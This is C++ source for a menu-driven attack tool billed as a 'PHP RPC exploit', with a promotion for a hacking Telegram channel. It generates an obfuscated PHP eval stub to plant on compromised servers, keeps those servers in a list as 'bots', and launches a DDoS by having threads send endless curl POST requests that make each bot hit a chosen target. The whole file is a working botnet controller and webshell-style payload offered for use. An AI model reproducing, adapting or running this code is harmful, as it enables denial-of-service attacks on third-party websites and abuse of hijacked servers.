#include <iostream>
#include <string>
#include <fstream>
#include <thread>
#include <ncurses.h>
#include <vector>
#include <stdio.h>
#include <curl/curl.h>
#include <cstring>

using namespace std;

//g++ version 8.2.0 (Debian 8.2.0-20)


/* Made by THack3forU ) 
=======================================================
Unite and Fight!
Join to channel https://t.me/UrkaineHack,
u will find a lot of interesting things on our channel.
History remembers the truth!
U can change everything!
And make life better ;)
=======================================================
Glory Ukraine! */
string pwd = "";
ifstream bot_read;
void list_bots(){
	char *str = new char [512];
  int i=0;
  ifstream bots("servers.txt");
  while (!bots.eof())
  {
      bots.getline(str, 512, '\n');
      i++;
      cout << to_string(i) << ". " << str << endl;
      
  }

  bots.close();
  delete str;

}
ofstream bot_write;
void add_bot(){
	string bot;
	cout << "Exemple: http://site.com/payload.php" << endl;
	cout << "bot: ";
	cin >> bot;
	bot_write.open("servers.txt", ios_base::app);
	bot_write << "\n"+bot;
	bot_write.close();
	cout << "\nIf you make a mistake in text, you need to manually edit the servers.txt file!" << endl;
}
void attack(string link, string arg){
	char linkc[link.size() + 1];
	strcpy(linkc, link.c_str());
	
	char argc[arg.size() + 1];
	strcpy(argc, arg.c_str());
	
	string all = link + arg;
	
	char all_link[all.size() + 1];
	strcpy(all_link, all.c_str());
	
	while(true){
		CURL *curl;
  	CURLcode res;
  	curl_global_init(CURL_GLOBAL_ALL);
 
  
  	curl = curl_easy_init();
  	if(curl) {
	
    	curl_easy_setopt(curl, CURLOPT_URL, all_link);
    	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, argc);
    	res = curl_easy_perform(curl);
    	curl_easy_cleanup(curl);
  	}
  	curl_global_cleanup();
	}
}

ofstream payload_write;
ifstream payload_read;
void payload(){
	payload_write.open("payload.php");
	payload_write << "<?php function decode($encoded, $key){$strofsym=\"qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM=\";$x=0;while ($x++<= strlen($strofsym)) {$tmp = md5(md5($key.$strofsym[$x-1]).$key);$encoded = str_replace($tmp[1].$tmp[2].$tmp[3].$tmp[4], $strofsym[$x-1], $encoded);}return base64_decode($encoded);}eval(decode('','THack3forU'));?>";
	payload_write.close();

	cout << "Build payload compiled...\n"<< "Payload save to "<< pwd.erase(0,4) <<"/payload.php" << endl;
	
	
}
vector<string> list_servers;
void exploit(){
	unsigned int thre = 1;
	cout << "Thread: ";
	cin >> thre;
	string kl = "1";
	string url = "";
	cout << "Target: ";
	cin >> url;
	cout << "The number of requests to the target from the server: ";
	cin >> kl;
	ifstream payload_read("servers.txt");
	if (!payload_read.is_open()) {
  	cout << "File could not be opened!" << endl;
		return;
	}
	string temp_servers;
	while (!payload_read.eof())
    {
        getline(payload_read, temp_servers);
        list_servers.push_back(temp_servers);
        
        
    }
		for(int i = 0; i < list_servers.size(); i++) {
				if(list_servers[i] != "" && list_servers[i] != " "){
        	string temp = list_servers[i];
        	string tempp = "?url="+url+"&kl="+kl;
        	for(int y=0;y<thre;y++){
        		thread thr(attack, temp, tempp);
						thr.detach();
					}
					cout << "Server " + list_servers[i] + " start attack\n" << endl;
				}
    }
    cout << "All servers start attack!\n" << endl;
    cout << "To stop DDoS, write stop and press enter... ";
    string a;
    cin >> a;
}

const char items[5][9] = {
    "Payload", 
    "Exploit",
    "Add bot",
    "List bot",
    "Exit",
};

int main(int argnum, char* argc[], char*argv[])
{
	system("clear");
	pwd = argv[11];
	initscr();
	start_color();
	init_pair(1, COLOR_RED, 0);
	init_pair(2, COLOR_WHITE, 0);
	init_pair(3, COLOR_BLUE, 0);
	bool menu = true;
	unsigned choice = 0;
	
	curs_set(0); 
	keypad(stdscr, true); 
	
	while ( menu )
	{
		clear();
		attron(A_BOLD);
		attron (COLOR_PAIR(3));
		printw ("%s \n", "PHP RPC exploit made by THack3forU Team v2.0\n");
		attroff (COLOR_PAIR(3));
		attron (COLOR_PAIR(1));
		
		printw ("%s \n", "Select item:");
		attroff(A_BOLD);
		attroff (COLOR_PAIR(1));
		for ( unsigned i = 0; i < 5; i++ )
		{
		
			if ( i == choice ){
			addch('[');
			attron(A_BOLD);
			attron (COLOR_PAIR(1));
			addch('*');
			attroff(A_BOLD);
			attroff (COLOR_PAIR(1));
			addch(']');
			addch(' '); }
			else{       
			addch('['); 
			addch(' '); 
			addch(']');
			addch(' '); 
			}
			printw("%s\n", items[i]);
			
		}
		attron(A_BOLD);
		attron (COLOR_PAIR(1));
		if(choice == 0){
   		printw ("%s \n", "\nGenerates PHP-RPC payload!");
  	}if(choice == 1){
   		printw ("%s \n", "\nStarts an attack on the selected site using the bots specified in servers.txt!");
  	}if(choice == 2){
   		printw ("%s \n", "\nAdds a bot to the list servers.txt.\nExample: http://site.com/payload.php");
  	}if(choice == 3){
   		printw ("%s \n", "\nList all bots. This may help find errors in the list of bots.");
  	}if(choice == 4){
   		printw ("%s \n", "\nExit...");
  	}
  	attroff(A_BOLD);
		attroff(COLOR_PAIR(1));
		switch ( getch() )
		{
			case KEY_UP:
				if ( choice )
 					choice--;
				break;
			case KEY_DOWN:
				if ( choice != 4 ) 
					choice++;
				break;
			case '\n': 
				menu = false;
				break;  
            
		}
	}
	  
	endwin();
  if(choice == 0){
  	payload();
  }if(choice == 1){
  	exploit();
  }if(choice == 2){
  	add_bot();
  }if(choice == 3){
  	list_bots();
  }if(choice == 4){
  	return 0;
  }

}
